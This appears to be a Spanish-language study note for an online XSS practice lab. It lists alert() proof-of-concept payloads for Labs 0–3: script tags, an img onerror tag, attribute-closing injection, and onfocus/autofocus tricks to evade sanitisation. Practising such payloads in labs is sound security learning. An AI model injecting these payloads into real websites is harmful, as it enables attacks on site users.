# XSS Lab

Tags: #XSS #Challenges

```bash
# En estos laboratorios debemos de mirar el inspector y el código fuente de la web para saber que debemos ir haciendo. Nos ayuda a practicar y como ir evadiendo en el codifo fuente 
```

* [Ejercicios-XSS](https://sudo.co.il/xss/)
## Lab 0

```javascript
<script>alert("XSS")</script>                 // Script basico 
<img src/onerror=alert(document.domain)>      // Para que nos regres el dominio del sitio web 
```

## Lab 1

```javascript
// Debemos de cerrar el campo valor e inyectar el codigo 

"><script>alert("XSS")</script>"              // Debemos de cerrar el campo 'valor' para poder inyectar codigo JavaScript
" onfocus="alert(1)" autofocus="              // Otra manera de colocar alert 
```

## Lab 2 

```javascript
// Cuando el codigo esta sanitizado, a veces no deja que coloquemos '< o >' por lo que debemos buscar otra manera de colocar alert

" onfocus="alert(1)" autofocus="          
```

## Lab 3 

```javascript
// En este lab nos colocan un guion '-' como forma de sanitizar 

"onfocus="alert(1)" autofocus="
```